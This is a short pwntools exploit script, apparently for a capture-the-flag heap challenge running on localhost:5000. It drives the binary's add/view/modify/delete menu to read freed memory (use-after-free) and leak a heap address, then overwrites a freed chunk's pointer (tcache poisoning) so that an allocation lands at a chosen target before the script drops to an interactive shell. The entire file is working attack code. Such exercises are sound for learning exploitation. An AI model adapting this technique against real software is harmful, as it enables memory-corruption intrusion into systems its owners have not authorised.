from pwn import *
fn = "./src"
elf = ELF(fn, checksec=False)
context.binary = elf
p = remote("localhost", 5000)

sla = lambda x, y: p.sendlineafter(x, y)
num_to_bytes = lambda x: str(x).encode("ascii")

def add(name: bytes, age: int):
    sla(b">", b"1")
    sla(b"Name:", name)
    sla(b"Age:", num_to_bytes(age))

def delete(idx: int):
    sla(b">", b"4")
    sla(b"Idx:", num_to_bytes(idx))

def view(idx: int) -> bytes:
    sla(b">", b"2")
    sla(b"Idx:", num_to_bytes(idx))
    # TODO: process leak
    p.recvuntil(b"Name: ")
    return p.recvuntil(b"\nAge:")[:-len(b"\nAge:")]

def modify(idx: int, name: bytes):
    sla(b">", b"3")
    sla(b"Idx:", num_to_bytes(idx))
    sla(b"New name?", name)

add(b"a", 0)
add(b"b", 0)
delete(0)
delete(1)

heap_leak = u64(view(1)[:8].ljust(8, b"\0"))
print(hex(heap_leak))
target = heap_leak - 0x5593c7cdd290 + 0x5593c7cdc260
print(f"Target: {hex(target)}")

modify(1, p64(target))
add(b"c", 0)
add(b"d", 0)
sla(b">", b"5")  # exit

p.interactive()